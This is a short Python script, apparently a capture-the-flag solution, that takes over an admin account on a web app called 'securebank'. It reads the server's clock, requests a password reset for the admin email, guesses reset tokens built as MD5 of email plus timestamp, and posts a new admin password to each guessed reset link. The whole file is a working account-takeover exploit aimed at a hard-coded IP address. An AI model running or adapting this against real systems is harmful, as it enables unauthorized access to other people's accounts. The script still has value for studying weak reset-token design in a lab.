import hashlib
import requests
import time

BASE_URL = "http://34.143.202.132:5000"
ADMIN_EMAIL = "admin@securebank.local"
NEW_PASSWORD = "Password123!"

def solve():
    session = requests.Session()
    
    # 1. Sync Time
    print("[*] Syncing server time...")
    res = session.get(f"{BASE_URL}/api/server-time")
    start_t = int(res.json()['timestamp'])

    # 2. Trigger Reset
    print("[*] Requesting reset...")
    session.post(f"{BASE_URL}/forgot-password", data={"email": ADMIN_EMAIL})
    
    # 3. Brute force the token and immediately SUBMIT the new password
    print("[*] Finding token and resetting password...")
    for t in range(start_t - 1, start_t + 5):
        token_data = f"{ADMIN_EMAIL}{t}"
        token = hashlib.md5(token_data.encode()).hexdigest()
        
        # Try to POST the new password directly to the reset endpoint
        reset_url = f"{BASE_URL}/reset-password/{token}"
        resp = session.post(reset_url, data={
            "password": NEW_PASSWORD,
            "confirm_password": NEW_PASSWORD
        }, allow_redirects=False)

        # If the server redirects to /login (302), the reset worked!
        if resp.status_code == 302 and "login" in resp.headers.get('Location', ''):
            print(f"[+] SUCCESS! Admin password reset to: {NEW_PASSWORD}")
            print(f"[+] Valid Timestamp was: {t}")
            return True
            
    print("[-] Failed. Try running again.")
    return False

if __name__ == "__main__":
    solve()
